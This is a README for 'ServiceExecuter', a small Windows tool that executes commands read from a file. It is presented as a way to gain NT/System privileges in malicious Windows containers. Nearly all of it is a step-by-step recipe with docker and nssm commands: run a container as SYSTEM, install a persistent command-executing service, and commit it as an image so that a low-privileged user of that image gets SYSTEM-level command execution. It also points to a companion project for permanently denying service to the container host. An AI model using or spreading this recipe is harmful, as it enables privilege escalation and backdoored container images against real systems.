# ServiceExecuter
This project reads command from a file, execute it and then write the output to another file. It can be used in order to gain NT/System in malicious windows containers.


# Gain NT/System using malicious container image:

1. Compile this project using Visual Studio 
2. Download the files to the container: 
3. Start the container as NT/System with shared folder between the container's host and the container so it will be possible to share files with the container.
docker run  -it --isolation=process --name=<desired_container_name> -v c:\tmp:c:\tmp --user="NT Authority\System" mcr.microsoft.com/windows/servercore:ltsc2022 cmd  
4. Copy to the container under c:\temp\
	* nssm.exe (https://nssm.cc/)
	* ServiceExecuter.exe - compiled 
5. Create a service using nssm:
	* c:\temp\nssm.exe install EoP4 C:\temp\ServiceExecuter.exe c:\temp\input.txt c:\temp\output.txt
6. Start the service: 
	* c:\temp\nssm.exe start EoP4 
7. Validate everything works as expected: expect the output.txt to be "NT/System"
	```
	echo whoami > c:\temp\input.txt
	more c:\temp\output.txt   
	del c:\temp\output.txt   
	```
8. Exit the container

<In the host> 
9. Store the container as container image 
	* docker commit <desired_container_name>  <desired_container_name>

<DONE> 

Trigger the Privilege of escalation: 
* docker run  --rm -it --isolation=process --name=<desired_container_name_2> --user="ContainerUser" <desired_container_name>  cmd
* whoami /User /Priv
* echo whoami > c:\temp\input.txt  
* more c:\temp\output.txt   


If you wish to do permanent DoS to the container's host see the project NVRAM